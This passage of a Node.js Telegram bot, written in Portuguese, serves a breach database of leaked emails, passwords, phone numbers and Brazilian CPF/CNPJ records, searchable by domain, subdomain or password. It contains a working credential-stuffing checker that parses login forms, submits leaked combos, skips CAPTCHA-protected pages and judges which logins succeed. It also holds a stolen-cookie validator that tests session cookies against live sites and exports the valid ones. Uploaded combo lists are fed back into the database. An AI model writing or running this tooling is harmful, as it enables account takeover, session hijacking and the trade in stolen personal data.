    for (const sub of sortedSubs) {
      const rows = subMap.get(sub);
      const cleanedRows = [];
      const seen = new Set();
      for (const row of rows) {
        let url = row.url || '';
        let email = row.email || '';
        let senha = row.senha || '';
        if (!email.trim() || !senha.trim()) continue;
        if (!isPremium && url && GOV_BLOCK_RE.test(url)) continue;
        const key = `${email.trim()}:${senha.trim()}`;
        if (seen.has(key) || cleanedRows.length >= rowLimit) continue;
        seen.add(key);
        cleanedRows.push({ url: url.trim(), email: email.trim(), senha: senha.trim() });
      }
      if (cleanedRows.length === 0) continue;

      totalLogins += cleanedRows.length;
      allContent += `\n${'═'.repeat(50)}\n`;
      allContent += `SUBDOMÍNIO: ${sub} (${cleanedRows.length} logins)\n`;
      allContent += `${'═'.repeat(50)}\n`;
      allContent += cleanedRows.map(formatRowFn).join('\n');
      allContent += '\n';
    }

    if (totalLogins === 0) {
      if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para subdomínios de \`${domain}\``, opts({ parse_mode: 'Markdown' }));
    }

    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    let header = `SUBDOMÍNIOS DE: ${domain}\n`;
    header += `Total: ${sortedSubs.length} subdomínios com ${totalLogins} logins\n`;
    header += `Subdomínios encontrados:\n`;
    sortedSubs.forEach(s => { header += `  • ${s}\n`; });
    header += `\n`;

    const content = header + allContent;
    const safeQuery = domain.replace(/[^a-zA-Z0-9_\-\.]/g, '_').slice(0, 40);
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *SUBDOMÍNIOS:* \`${domain}\`\n🌐 _${sortedSubs.length} subdomínios • ${totalLogins.toLocaleString('pt-BR')} logins_\n\n${sortedSubs.slice(0, 15).map(s => `• \`${s}\``).join('\n')}${sortedSubs.length > 15 ? `\n_...e mais ${sortedSubs.length - 15}_` : ''}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_subs_${safeQuery}.txt`, contentType: 'text/plain' });

  } catch (err) {
    console.error(`[BOT] sendSubdomainResults error:`, err);
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Domínio com muitos registros.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// /checkdomain — RESUME TUDO DE UM DOMÍNIO
// Exemplo: /checkdomain site.com
// ══════════════════════════════════════════════════
async function sendCheckDomainResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 3) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/checkdomain <dominio>\`\n\nExemplos:\n• \`/checkdomain site.com\`\n• \`/checkdomain empresa.com.br\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const q = query.trim().replace(/^https?:\/\//, '').split('/')[0];
  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'typing', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `🔎 *Analisando domínio:* \`${q}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    await client.query(`SET LOCAL statement_timeout = '60s'`);

    const r = await client.query(
      `SELECT
         COUNT(*)                                                        AS total,
         COUNT(DISTINCT email) FILTER (WHERE email IS NOT NULL AND email != '') AS unique_emails,
         COUNT(DISTINCT senha) FILTER (WHERE senha  IS NOT NULL AND senha  != '') AS unique_pass,
         COUNT(DISTINCT telefone) FILTER (WHERE telefone IS NOT NULL AND telefone != '') AS unique_phones
       FROM credentials
       WHERE url ILIKE $1`,
      [`%${q}%`]
    );

    // Pega amostra dos 5 emails mais comuns
    const topEmails = await client.query(
      `SELECT email, COUNT(*) AS c FROM credentials
       WHERE url ILIKE $1 AND email IS NOT NULL
       GROUP BY email ORDER BY c DESC LIMIT 5`,
      [`%${q}%`]
    );

    await client.query('COMMIT');
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    const { total, unique_emails, unique_pass, unique_phones } = r.rows[0];

    if (Number(total) === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhum registro encontrado para \`${q}\``,
        opts({ parse_mode: 'Markdown' })
      );
    }

    const topList = topEmails.rows.length > 0
      ? '\n\n*📧 Top emails:*\n' + topEmails.rows.map(r => `  \`${r.email}\` (${r.c}x)`).join('\n')
      : '';

    await bot.sendMessage(chatId,
      `📊 *Database:* \`${q}\`\n\n` +
      `Registros: \`${Number(total).toLocaleString('pt-BR')}\`\n` +
      `Emails: \`${Number(unique_emails).toLocaleString('pt-BR')}\`\n` +
      `Senhas: \`${Number(unique_pass).toLocaleString('pt-BR')}\`\n` +
      `Telefones: \`${Number(unique_phones).toLocaleString('pt-BR')}\`` +
      topList +
      `\n\n_Use \`/url ${q}\` para baixar registros_`,
      opts({ parse_mode: 'Markdown' })
    );

  } catch (err) {
    await client.query('ROLLBACK').catch(() => {});
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente um domínio mais específico.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  } finally {
    client.release();
  }
}


// ══════════════════════════════════════════════════
// SETUP DO BOT
// ══════════════════════════════════════════════════
export function isMaintenance() { return maintenanceMode; }

export function setupBot(app, pool, writePool, publicPool) {
  if (!TOKEN) {
    console.warn('⚠️ TELEGRAM_TOKEN não definido. Bot desativado.');
    return;
  }

  // Atribui pool de escrita para funções de licença/trial
  _writePool = writePool;
  _publicPool = publicPool || pool;



  // Migração: adiciona coluna last_reset na tabela bot_trials
  _writePool.query(`ALTER TABLE bot_trials ADD COLUMN IF NOT EXISTS last_reset TIMESTAMPTZ DEFAULT NOW()`).catch(() => {});

  // Cria o bot AQUI (não no nível do módulo) para evitar dupla polling
  bot = new TelegramBot(TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 5 } } });
  console.log('🤖 [BOT] Telegram Bot OTIMIZADO (polling: 300ms, timeout: 5s).');

  // Remove botão "ABRIR APP" → substitui por "MENU" com comandos
  const https = require('https');
  const menuBtnData = JSON.stringify({ menu_button: { type: 'commands' } });
  const menuBtnReq = https.request(`https://api.telegram.org/bot${TOKEN}/setChatMenuButton`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(menuBtnData) }
  }, (res) => {
    let body = '';
    res.on('data', (d) => body += d);
    res.on('end', () => {
      try { /* Menu button configurado silenciosamente */ JSON.parse(body); }
      catch { }
    });
  });
  menuBtnReq.on('error', () => {});
  menuBtnReq.write(menuBtnData);
  menuBtnReq.end();

  // Configura o Menu do Telegram com os comandos de busca
  bot.setMyCommands([
    { command: 'start', description: '🏠 MENU PRINCIPAL' },
    { command: 'login', description: '🔓 LOGIN COM CREDENCIAIS' },
    { command: 'ferramentas', description: '🛠️ FERRAMENTAS DISPONÍVEIS' },
    { command: 'consultardados', description: '🔎 CONSULTAR DADOS AVANÇADO' },
    { command: 'url', description: '🔗 Buscar por URL' },
    { command: 'INURL', description: '🔗 Buscar por termo na URL' },
    { command: 'email', description: '✉️ Buscar por E-mail' },
    { command: 'user', description: '👤 Buscar por Usuário' },
    { command: 'SENHA', description: '🔒 Buscar por Senha' },
    { command: 'TELEFONE', description: '📞 Buscar por Telefone' },
    { command: 'ip', description: '📍 Buscar por IP' },
    { command: 'cpf', description: '📋 Buscar por CPF' },
    { command: 'cnpj', description: '🏢 Buscar por CNPJ' },
    { command: 'domain', description: '🌍 Buscar por Domínio' },
    { command: 'subdominios', description: '🚀 Buscar Subdomínios' },
    { command: 'WHOIS', description: '🔍 Consultar Whois' },
    { command: 'GEOIP', description: '📍 Consultar GeoIP' },
    { command: 'consulta', description: '🔎 Consultas avançadas (PRO)' },
    { command: 'total', description: '📊 Atualizar estatísticas do DB (admin)' },
  ]).catch(() => {});

  // Wraps — processReplyMarkup extrai emoji do texto, remove, e coloca icon_custom_emoji_id
  const _origSend = bot.sendMessage.bind(bot);
  bot.sendMessage = function(chatId, text, options = {}) {
    if (options?.reply_markup) {
      options.reply_markup = processReplyMarkup(options.reply_markup);
    }
    return _origSend(chatId, text, options);
  };

  const _origEdit = bot.editMessageText.bind(bot);
  bot.editMessageText = function(text, options = {}) {
    if (options?.reply_markup) {
      options.reply_markup = processReplyMarkup(options.reply_markup);
    }
    return _origEdit(text, options);
  };

  // Função helper para enviar mensagens ao chat configurado (Portal SISP)
  async function sendToAdminChat(text, options = {}) {
    try {
      return await bot.sendMessage(TELEGRAM_CHAT_ID, text, options);
    } catch (error) {
      console.error('❌ Erro ao enviar mensagem ao chat admin:', error.message);
      return null;
    }
  }

  // Exportar função helper globalmente para uso em outros scripts
  global.sendToTelegramChat = sendToAdminChat;
  bot.sendToAdminChat = sendToAdminChat;

  let conflictCount = 0;
  bot.on('polling_error', (err) => {
    if (err.code === 'ETELEGRAM' && err.message?.includes('409')) {
      conflictCount++;
      if (conflictCount >= 3) {
        console.log('🛑 [BOT] Conflito persistente. Desligando polling desta instância.');
        bot.stopPolling();
        return;
      }
      console.log(`⚠️ [BOT] Conflito de polling (${conflictCount}/3). Aguardando 5s...`);
      bot.stopPolling();
      setTimeout(() => {
        bot.startPolling();
        console.log('🤖 [BOT] Polling reiniciado.');
      }, 5000);
    } else {
      console.error('[BOT] polling_error:', err.message);
    }
  });

  // ══════════════════════════════════════════════════
  // CHECKER — INTELIGENTE (analisa form + headers)
  // ══════════════════════════════════════════════════

  // Extrai inputs de um HTML (name, type, value)
  function extractFormData(html) {
    const forms = [];
    // Encontra todos os <form>
    const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/gi;
    let formMatch;
    while ((formMatch = formRegex.exec(html)) !== null) {
      const formTag = formMatch[0];
      const formBody = formMatch[1];
      // Extrai action
      const actionMatch = formTag.match(/action\s*=\s*["']([^"']*?)["']/i);
      const methodMatch = formTag.match(/method\s*=\s*["']([^"']*?)["']/i);
      const action = actionMatch ? actionMatch[1] : '';
      const method = (methodMatch ? methodMatch[1] : 'POST').toUpperCase();

      // Extrai todos os <input>
      const inputs = [];
      const inputRegex = /<input[^>]*>/gi;
      let inputMatch;
      while ((inputMatch = inputRegex.exec(formBody)) !== null) {
        const tag = inputMatch[0];
        const name = (tag.match(/name\s*=\s*["']([^"']*?)["']/i) || [])[1] || '';
        const type = (tag.match(/type\s*=\s*["']([^"']*?)["']/i) || [])[1] || 'text';
        const value = (tag.match(/value\s*=\s*["']([^"']*?)["']/i) || [])[1] || '';
        const id = (tag.match(/id\s*=\s*["']([^"']*?)["']/i) || [])[1] || '';
        if (name) inputs.push({ name, type: type.toLowerCase(), value, id: id.toLowerCase() });
      }

      // Só interessa forms com campo password
      const hasPassword = inputs.some(i => i.type === 'password');
      if (hasPassword) {
        forms.push({ action, method, inputs });
      }
    }
    return forms;
  }

  async function checkLogin(url, email, senha) {
    try {
      let baseUrl = url;
      if (!baseUrl.startsWith('http://') && !baseUrl.startsWith('https://')) {
        baseUrl = 'https://' + baseUrl;
      }

      const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

      // 1. GET a página pra analisar o form
      const ctrl1 = new AbortController();
      const t1 = setTimeout(() => ctrl1.abort(), 4000);
      const pageRes = await fetch(baseUrl, {
        method: 'GET',
        headers: { 'User-Agent': UA, 'Accept': 'text/html,*/*' },
        redirect: 'follow',
        signal: ctrl1.signal,
      });
      clearTimeout(t1);
      const html = await pageRes.text();

      // Detecta CAPTCHA
      const htmlLow = html.toLowerCase();
      if (htmlLow.includes('recaptcha') || htmlLow.includes('g-recaptcha') ||
          htmlLow.includes('hcaptcha') || htmlLow.includes('h-captcha') ||
          htmlLow.includes('cf-turnstile') || htmlLow.includes('turnstile') ||
          htmlLow.includes('funcaptcha') || htmlLow.includes('arkose') ||
          htmlLow.includes('captcha-container') || htmlLow.includes('captcha_')) {
        return { valid: false, reason: 'captcha' };
      }

      // 2. Extrai forms com campo password
      const forms = extractFormData(html);

      if (forms.length === 0) {
        // Sem form: tenta Basic Auth como fallback
        const ctrl2 = new AbortController();
        const t2 = setTimeout(() => ctrl2.abort(), 4000);
        const basicAuth = Buffer.from(`${email}:${senha}`).toString('base64');
        const authRes = await fetch(baseUrl, {
          method: 'GET',
          headers: { 'User-Agent': UA, 'Authorization': `Basic ${basicAuth}` },
          redirect: 'manual',
          signal: ctrl2.signal,
        });
        clearTimeout(t2);
        const cookies = authRes.headers.get('set-cookie') || '';
        if (authRes.status === 200 && (cookies.includes('session') || cookies.includes('token'))) {
          return { valid: true, reason: 'basic_auth_ok' };
        }
        if (authRes.status === 302) {
          const loc = (authRes.headers.get('location') || '').toLowerCase();
          if (!loc.includes('login') && !loc.includes('signin') && !loc.includes('error')) {
            return { valid: true, reason: 'basic_redirect_ok' };
          }
        }
        return { valid: false, reason: 'no_form' };
      }

      // 3. Pega o primeiro form com password
      const form = forms[0];

      // Monta a URL de action
      let actionUrl = form.action;
      if (!actionUrl || actionUrl === '#' || actionUrl === '') {
        actionUrl = baseUrl;
      } else if (actionUrl.startsWith('/')) {
        const u = new URL(baseUrl);
        actionUrl = u.origin + actionUrl;
      } else if (!actionUrl.startsWith('http')) {
        const u = new URL(baseUrl);
        actionUrl = u.origin + '/' + actionUrl;
      }

      // 4. Preenche os campos inteligentemente
      const postData = {};
      const userFields = ['email', 'user', 'username', 'login', 'usuario', 'mail', 'account', 'name', 'cpf', 'phone', 'mobile', 'cel'];
      const passFields = ['password', 'pass', 'passwd', 'SENHA', 'pwd', 'secret'];

      for (const input of form.inputs) {
        const n = input.name.toLowerCase();
        const t = input.type;
        const i = input.id;

        if (t === 'password') {
          // Campo de senha
          postData[input.name] = senha;
        } else if (t === 'hidden' || t === 'submit') {
          // Campos hidden (CSRF tokens etc) e submit: mantém valor original
          if (input.value) postData[input.name] = input.value;
        } else if (t === 'email' || userFields.some(f => n.includes(f) || i.includes(f))) {
          // Campo de email/usuário
          postData[input.name] = email;
        } else if (passFields.some(f => n.includes(f) || i.includes(f))) {
          postData[input.name] = senha;
        }
      }

      // Se não achou campo de user, adiciona no primeiro input de text
      const hasUser = Object.values(postData).includes(email);
      if (!hasUser) {
        const firstText = form.inputs.find(i => i.type === 'text' || i.type === 'email');
        if (firstText) postData[firstText.name] = email;
      }

      // 5. Envia POST com os parâmetros descobertos
      const ctrl3 = new AbortController();
      const t3 = setTimeout(() => ctrl3.abort(), 4000);

      // Pega cookies da página original
      const pageCookies = pageRes.headers.get('set-cookie') || '';

      const postRes = await fetch(actionUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': UA,
          'Accept': 'text/html,application/json,*/*',
          'Referer': baseUrl,
          'Origin': new URL(baseUrl).origin,
          'Cookie': pageCookies.split(',').map(c => c.split(';')[0].trim()).join('; '),
        },
        body: new URLSearchParams(postData).toString(),
        redirect: 'manual',
        signal: ctrl3.signal,
      });
      clearTimeout(t3);

      // 6. Analisa resposta
      const resCookies = postRes.headers.get('set-cookie') || '';
      const hasSession = resCookies.toLowerCase().includes('session') ||
                         resCookies.toLowerCase().includes('token') ||
                         resCookies.toLowerCase().includes('auth') ||
                         resCookies.toLowerCase().includes('logged');

      // Redirect = analisa destino
      if (postRes.status === 301 || postRes.status === 302 || postRes.status === 303) {
        const loc = (postRes.headers.get('location') || '').toLowerCase();
        const isLoginPage = loc.includes('login') || loc.includes('signin') || loc.includes('auth') || loc.includes('error') || loc.includes('fail');
        const isDashboard = loc.includes('dashboard') || loc.includes('home') || loc.includes('account') ||
                           loc.includes('panel') || loc.includes('welcome') || loc.includes('profile') ||
                           loc.includes('inbox') || loc.includes('feed') || loc.includes('main');
        if (isDashboard || (hasSession && !isLoginPage)) {
          return { valid: true, reason: 'redirect_ok' };
        }
        if (isLoginPage) {
          return { valid: false, reason: 'redirect_login' };
        }
        // Redirect genérico com cookie de sessão = provavelmente ok
        if (hasSession) {
          return { valid: true, reason: 'session_cookie' };
        }
      }

      // 200 = analisa body
      if (postRes.status === 200) {
        const body = (await postRes.text()).toLowerCase();
        const failWords = ['invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied', 'unauthorized',
                          'senha incorreta', 'credenciais', 'tente novamente', 'try again', 'not found',
                          'does not exist', 'not match', 'falha'];
        const successWords = ['welcome', 'dashboard', 'logout', 'sign out', 'my account', 'minha conta',
                             'profile', 'settings', 'configurações'];

        const hasFail = failWords.some(w => body.includes(w));
        const hasSuccess = successWords.some(w => body.includes(w));

        if (hasSuccess && !hasFail) return { valid: true, reason: 'body_success' };
        if (hasSession && !hasFail) return { valid: true, reason: 'session_ok' };
        if (hasFail) return { valid: false, reason: 'body_fail' };
        if (hasSession) return { valid: true, reason: 'session_ok' };
      }

      return { valid: false, reason: `http_${postRes.status}` };

    } catch (e) {
      const reason = e.name === 'AbortError' ? 'timeout' : (e.code || e.message?.slice(0, 30) || 'error');
      return { valid: false, reason };
    }
  }

  // ══════════════════════════════════════════════════
  // COOKIE CHECKER — DETECTA, VALIDA, MONTA JSON
  // ══════════════════════════════════════════════════

  function detectCookieFile(content) {
    const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0).slice(0, 20);
    if (lines.length === 0) return false;
    const trimmed = content.trim();
    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
      try {
        const j = JSON.parse(trimmed);
        const arr = Array.isArray(j) ? j : [j];
        if (arr.some(c => c.name && c.value)) return true;
      } catch(e) {}
    }
    let cookieScore = 0, loginScore = 0;
    for (const line of lines) {
      if (line.split('\t').length >= 6) cookieScore += 2;
      if (/[a-zA-Z_]+=[^:@]+;/.test(line) && !line.includes('@')) cookieScore += 2;
      if (line.includes('@') && line.includes(':')) loginScore += 2;
    }
    return cookieScore > loginScore;
  }

  function parseCookieBlocks(content) {
    const blocks = [];
    const trimmed = content.trim();
    // JSON
    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
      try {
        let arr = JSON.parse(trimmed);
        if (!Array.isArray(arr)) arr = [arr];
        const byDomain = {};
        for (const c of arr) {
          if (!c.name || !c.value) continue;
          const dom = c.domain || c.host || 'unknown';
          if (!byDomain[dom]) byDomain[dom] = [];
          byDomain[dom].push(c);
        }
        for (const [dom, cookies] of Object.entries(byDomain)) {
          const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
          blocks.push({ url: `https://${dom.replace(/^\./, '')}`, cookieStr, raw: cookies });
        }
        return blocks;
      } catch(e) {}
    }
    const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0);
    // Netscape
    const netscape = lines.filter(l => l.split('\t').length >= 6 && !l.startsWith('#'));
    if (netscape.length > 0) {
      const byDomain = {};
      for (const line of netscape) {
        const p = line.split('\t');
        const dom = p[0]?.replace(/^\./, '');
        const name = p[5], value = p[6] || '';
        if (!dom || !name) continue;
        if (!byDomain[dom]) byDomain[dom] = [];
        byDomain[dom].push({ name, value, domain: dom });
      }
      for (const [dom, cookies] of Object.entries(byDomain)) {
        blocks.push({ url: `https://${dom}`, cookieStr: cookies.map(c => `${c.name}=${c.value}`).join('; '), raw: cookies });
      }
      return blocks;
    }
    // URL | cookies  ou  URL\tcookies  ou  raw cookies
    for (const line of lines) {
      let url = '', cookieStr = '';
      if (line.includes('|')) {
        const parts = line.split('|').map(p => p.trim());
        url = parts[0]; cookieStr = parts.slice(1).join('|').trim();
      } else if (line.includes('\t') && (line.startsWith('http') || /^[a-z0-9.-]+\.[a-z]{2,}\t/i.test(line))) {
        const idx = line.indexOf('\t');
        url = line.substring(0, idx).trim(); cookieStr = line.substring(idx + 1).trim();
      } else if (/^[a-zA-Z_-]+=[^;]+;/.test(line) && !line.includes('@')) {
        cookieStr = line.trim();
      }
      if (cookieStr && /=/.test(cookieStr)) {
        if (url && !url.startsWith('http')) url = 'https://' + url;
        blocks.push({ url, cookieStr, raw: line });
      }
    }
    return blocks;
  }

  async function validateCookie(url, cookieStr) {
    if (!url) return { valid: false, reason: 'no_url' };
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 4000);
      const res = await fetch(url, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,*/*',
          'Cookie': cookieStr,
        },
        redirect: 'follow',
        signal: ctrl.signal,
      });
      clearTimeout(t);
      const body = (await res.text()).toLowerCase();
      if (body.includes('recaptcha') || body.includes('hcaptcha') || body.includes('captcha'))
        return { valid: false, reason: 'captcha' };
      const loginWords = ['login', 'sign in', 'log in', 'signin', 'entrar', 'forgot password'];
      const sessionWords = ['logout', 'sign out', 'log out', 'dashboard', 'my account', 'minha conta', 'profile', 'settings', 'welcome', 'sair'];
      const isLogin = loginWords.some(w => body.includes(w));
      const isLogged = sessionWords.some(w => body.includes(w));
      if (isLogged && !isLogin) return { valid: true, reason: 'session_active' };
      if (isLogged && isLogin) {
        if (sessionWords.filter(w => body.includes(w)).length > loginWords.filter(w => body.includes(w)).length)
          return { valid: true, reason: 'session_probable' };
      }
      if (isLogin && !isLogged) return { valid: false, reason: 'expired' };
      const resCookies = res.headers.get('set-cookie') || '';
      if (resCookies.toLowerCase().includes('session') || resCookies.toLowerCase().includes('token'))
        return { valid: true, reason: 'session_renewed' };
      if (res.status === 200 && !isLogin) return { valid: true, reason: 'http_200' };
      return { valid: false, reason: `uncertain_${res.status}` };
    } catch(e) {
      return { valid: false, reason: e.name === 'AbortError' ? 'timeout' : (e.code || 'error') };
    }
  }

  async function handleCookieCheck(chatId, doc, tmpPath, content, threadId) {
    const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
    let statusMsg;
    try {
      statusMsg = await bot.sendMessage(chatId,
        `📥 *Recebido:* \`${doc.file_name}\`\n🍪 _Detectado: COOKIES — Validando..._`,
        opts({ parse_mode: 'Markdown' })
      );
      const blocks = parseCookieBlocks(content);
      if (blocks.length === 0) {
        bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
        return bot.sendMessage(chatId, `❌ Nenhum cookie encontrado.\n\nFormatos:\n• \`URL | cookie1=val; cookie2=val\`\n• JSON: \`[{"name":"x","value":"y","domain":"z"}]\`\n• Netscape (export do navegador)`, opts({ parse_mode: 'Markdown' }));
      }
      const noUrl = blocks.filter(b => !b.url);
      const testable = blocks.filter(b => b.url);
      if (testable.length === 0) {
        bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
        return bot.sendMessage(chatId, `❌ Cookies sem URL/domínio. Use:\n\`URL | cookie1=val; cookie2=val\``, opts({ parse_mode: 'Markdown' }));
      }
      checkerStopSet.delete(chatId);
      await bot.editMessageText(
        `🍪 *Checando ${testable.length} cookies...*\n\n📊 0/${testable.length}`,
        { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: [[{ text: '🛑 PARAR', callback_data: `stop_check_${chatId}`, style: 'primary' }]] }
        }
      ).catch(() => {});
      const CONCURRENCY = 20;
      const valid = [], invalid = [];
      let checked = 0;
      for (let i = 0; i < testable.length; i += CONCURRENCY) {
        const batch = testable.slice(i, i + CONCURRENCY);
        const results = await Promise.all(batch.map(async (block) => {
          const result = await validateCookie(block.url, block.cookieStr);
          return { ...block, ...result };
        }));
        for (const r of results) { if (r.valid) valid.push(r); else invalid.push(r); }
        checked += batch.length;
        if (checked % 10 === 0 || checked === testable.length) {
          bot.editMessageText(
            `🍪 *Checando cookies...*\n\n✅ ${valid.length} | ❌ ${invalid.length}\n📊 ${checked}/${testable.length}`,
            { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown',
              reply_markup: { inline_keyboard: [[{ text: '🛑 PARAR', callback_data: `stop_check_${chatId}`, style: 'primary' }]] }
            }
          ).catch(() => {});
        }
        if (checkerStopSet.has(chatId)) { checkerStopSet.delete(chatId); break; }
      }
      bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
      // Monta JSON dos válidos
      if (valid.length > 0) {
        const jsonOutput = valid.map(v => {
          const cookies = v.cookieStr.split(';').map(c => {
            const eq = c.indexOf('=');
            if (eq === -1) return null;
            let domain = '';
            try { domain = new URL(v.url).hostname; } catch(e) {}
            return { name: c.substring(0, eq).trim(), value: c.substring(eq + 1).trim(), domain, path: '/', httpOnly: false, secure: true };
          }).filter(Boolean);
          return { url: v.url, status: v.reason, cookies };
        });
        const jsonStr = JSON.stringify(jsonOutput, null, 2);
        await bot.sendDocument(chatId, Buffer.from(jsonStr, 'utf8'), opts({
          caption: `✅ *COOKIES VÁLIDOS: ${valid.length}/${testable.length}*\n📊 _Hit Rate: ${((valid.length / testable.length) * 100).toFixed(1)}%_`,
          parse_mode: 'Markdown'
        }), { filename: `VALID_COOKIES_${valid.length}.json`, contentType: 'application/json' });
      }
      if (invalid.length > 0) {
        const invContent = invalid.map(r => `${r.url} | ${r.cookieStr} [${r.reason}]`).join('\n');
        await bot.sendDocument(chatId, Buffer.from(invContent, 'utf8'), opts({
          caption: `❌ *EXPIRADOS: ${invalid.length}*`, parse_mode: 'Markdown'
        }), { filename: `INVALID_COOKIES_${invalid.length}.txt`, contentType: 'text/plain' });
      }
      await bot.sendMessage(chatId,
        `📋 *COOKIE CHECK*\n\n📁 \`${doc.file_name}\`\n🍪 Total: ${blocks.length}\n🔍 Testados: ${testable.length}\n✅ Válidos: *${valid.length}*\n❌ Expirados: *${invalid.length}*\n⚠️ Sem URL: ${noUrl.length}\n\n🎯 *Hit Rate: ${testable.length > 0 ? ((valid.length / testable.length) * 100).toFixed(1) : 0}%*`,
        opts({ parse_mode: 'Markdown' })
      );
      fs.unlink(tmpPath, () => {});
    } catch (err) {
      console.error('[BOT] handleCookieCheck error:', err);
      if (statusMsg) bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
      bot.sendMessage(chatId, `❌ Erro no cookie check: ${err.message}`, opts()).catch(() => {});
    }
  }

  async function handleFileCheck(chatId, doc, pool, threadId, preDownloaded) {
    const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

    let statusMsg;
    try {
      statusMsg = await bot.sendMessage(chatId,
        `📥 *Recebido:* \`${doc.file_name}\`\n🔑 _Detectado: LOGINS — Checando..._`,
        opts({ parse_mode: 'Markdown' })
      );

      const filePath = preDownloaded || await bot.downloadFile(doc.file_id, TMP_DIR);
      const content = fs.readFileSync(filePath, 'utf8');
      const rawLines = content.split(/\r?\n/).filter(l => l.trim().length > 3);

      if (rawLines.length === 0) {
        bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
        return bot.sendMessage(chatId, `❌ Arquivo vazio.`, opts());
      }

      if (rawLines.length > 5000) {
        const skipped = rawLines.length - 5000;
        rawLines.length = 5000;
        bot.editMessageText(
          `📥 *Recebido:* \`${doc.file_name}\`\n🔑 _Detectado: LOGINS — Checando..._\n⚠️ _Arquivo grande: pegando as primeiras 5.000 linhas (${skipped.toLocaleString()} ignoradas)_`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
        ).catch(() => {});
      }

      // Parse combos: URL:EMAIL:PASS ou EMAIL:PASS
      // Também detecta formato buffer: "url:email:senha" (saída de checkers)
      const combos = [];
      for (let line of rawLines) {
        // Extrai valor dentro de buffer: "..." se presente
        const bufMatch = line.match(/(?:buffer|BUF)\s*:\s*"([^"]+)"/);
        if (bufMatch) line = bufMatch[1];

        const parts = line.split(/[:;|,\t]/);
        if (parts.length >= 3) {
          // Reconstrói URL se tiver http:// ou https://
          let url = parts[0];
          let startIdx = 1;
          if ((url.toLowerCase() === 'http' || url.toLowerCase() === 'https') && parts[1]?.startsWith('//')) {
            url = url + ':' + parts[1];
            startIdx = 2;
          }
          // Encontra email (com @) e senha (último)
          let email = '', senha = parts[parts.length - 1];
          for (let i = startIdx; i < parts.length - 1; i++) {
            if (parts[i].includes('@')) { email = parts[i]; break; }
          }
          if (!email) email = parts[startIdx] || '';
          combos.push({ url: url.trim(), email: email.trim(), senha: senha.trim(), raw: line });
        } else if (parts.length === 2) {
          combos.push({ url: '', email: parts[0].trim(), senha: parts[1].trim(), raw: line });
        }
      }

      if (combos.length === 0) {
        bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
        return bot.sendMessage(chatId, `❌ Nenhum combo válido encontrado no arquivo.`, opts());
      }

      // Insere todos os combos no banco via upload API
      bot.editMessageText(
        `📥 *Recebido:* \`${doc.file_name}\`\n💾 _Inserindo ${combos.length} combos no banco..._`,
        { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
      ).catch(() => {});
      try {
        const csvBody = combos.map(c => `${c.url}:${c.email}:${c.senha}`).join('\n');
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 30000);
        const insRes = await fetch(`${process.env.BASE_URL || 'https://breachdb-production-0da9.up.railway.app'}/api/upload-stream`, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain', 'x-source': 'telegram-bot' },
          body: csvBody,
          signal: ctrl.signal
        });
        clearTimeout(t);
        const insData = await insRes.json();
